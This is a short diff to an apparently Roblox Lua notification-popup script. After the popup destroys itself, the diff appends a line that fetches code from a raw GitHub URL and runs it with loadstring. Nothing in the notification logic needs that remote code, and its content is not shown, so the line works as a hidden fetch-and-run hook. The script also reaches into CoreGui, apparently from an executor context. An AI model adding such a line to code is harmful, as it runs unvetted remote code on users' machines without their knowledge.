@@ -1,3 +1,5 @@
+if game:GetService("CoreGui"):FindFirstChild("Notify") then game:GetService("CoreGui"):FindFirstChild("Notify"):Destroy() end
+
 local Notify = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local LeftMain = Instance.new("Frame")
@@ -88,3 +90,5 @@ task.wait(2.5)
 TS:Create(Main, TweenInfo.new(1.125), {Position = UDim2.new(2.05, 0, 0.855, 0)}):Play()
 task.wait(0.25)
 Notify:Destroy()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OptioniaI/nwt/main/ntwl"))()
